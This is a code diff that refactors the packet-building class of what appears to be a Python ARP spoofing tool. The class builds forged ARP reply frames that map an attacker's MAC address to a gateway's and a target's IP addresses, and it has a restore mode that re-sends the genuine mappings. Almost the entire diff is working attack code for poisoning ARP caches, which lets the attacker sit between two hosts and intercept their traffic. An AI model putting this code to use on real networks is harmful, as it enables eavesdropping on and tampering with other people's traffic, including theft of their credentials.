@@ -18,8 +18,6 @@ i = ' ' * 4  # Basic indentation level
 
 
 class ARPPacket(object):
-    ETHER_T = b'\x08\x06'  # Ethertype code of ARP (IETF RFC 7042)
-
     def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                  gateway_ip: str, target_ip: str):
         self.gateway_ip = inet_aton(gateway_ip)
@@ -27,10 +25,24 @@ class ARPPacket(object):
         self.attacker_mac = self.__mac_to_hex(attacker_mac)
         self.gateway_mac = self.__mac_to_hex(gateway_mac)
         self.target_mac = self.__mac_to_hex(target_mac)
+        self.eth_frame_to_gateway = self.gateway_mac + self.attacker_mac \
+                                    + b'\x08\x06'  # Ethertype of ARP IEEE 802.3
+        self.eth_frame_to_target = self.target_mac + self.attacker_mac \
+                                   + b'\x08\x06'
         self.restore_arp_table: bool = False
+        self.build()
 
     def __iter__(self):
         yield from (self.arp_pkt_to_gateway, self.arp_pkt_to_target)
+
+    def build(self):
+        self.__build_arp_header()
+        self.__build_arp_pkt_to_gateway()
+        self.__build_arp_pkt_to_target()
+
+    def restore_target_table(self):
+        self.restore_arp_table = True
+        self.build()
 
     @staticmethod
     def __mac_to_hex(mac_address: str) -> bytes:
@@ -42,42 +54,31 @@ class ARPPacket(object):
         return b''.join(bytes.fromhex(octet) for octet in
                         re.split('[:-]', mac_address))
 
-    @property
-    def arp_header(self):
-        """Builds a byte-string representation of the ARP header of a
-        packet as defined by IETF RFC 826."""
+    def __build_arp_header(self):       # Defined by IETF RFC 826
         hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
         protocol_address = b'\x08\x00'  # '\x08\x00' = IP
         hardware_address_len = b'\x06'
         protocol_address_len = b'\x04'
-        opcode = b'\x00\x02'            # '\x00\x02' = REPLY
-        return b''.join((hardware_address, protocol_address,
-                         hardware_address_len, protocol_address_len,
-                         opcode))
+        opcode = b'\x00\x02'            # '\x00\x02' = REPLY message
+        self.arp_header = b''.join((hardware_address, protocol_address,
+                                    hardware_address_len, protocol_address_len,
+                                    opcode))
 
-    @property
-    def eth_header_to_gateway(self):
-        return self.gateway_mac + self.attacker_mac + self.ETHER_T
-
-    @property
-    def eth_header_to_target(self):
-        return self.target_mac + self.attacker_mac + self.ETHER_T
-
-    @property
-    def arp_pkt_to_gateway(self):
+    def __build_arp_pkt_to_gateway(self):
         destination = self.target_mac if self.restore_arp_table is True \
             else self.attacker_mac
-        return b''.join((self.eth_header_to_gateway, self.arp_header,
-                         destination, self.target_ip,
-                         self.gateway_mac, self.gateway_ip))
+        self.arp_pkt_to_gateway = b''.join((self.eth_frame_to_gateway,
+                                            self.arp_header, destination,
+                                            self.target_ip, self.gateway_mac,
+                                            self.gateway_ip))
 
-    @property
-    def arp_pkt_to_target(self):
+    def __build_arp_pkt_to_target(self):
         destination = self.gateway_mac if self.restore_arp_table is True \
             else self.attacker_mac
-        return b''.join((self.eth_header_to_target, self.arp_header,
-                         destination, self.gateway_ip,
-                         self.target_mac, self.target_ip))
+        self.arp_pkt_to_target = b''.join((self.eth_frame_to_target,
+                                           self.arp_header, destination,
+                                           self.gateway_ip, self.target_mac,
+                                           self.target_ip))
 
 
 class Spoofer(object):
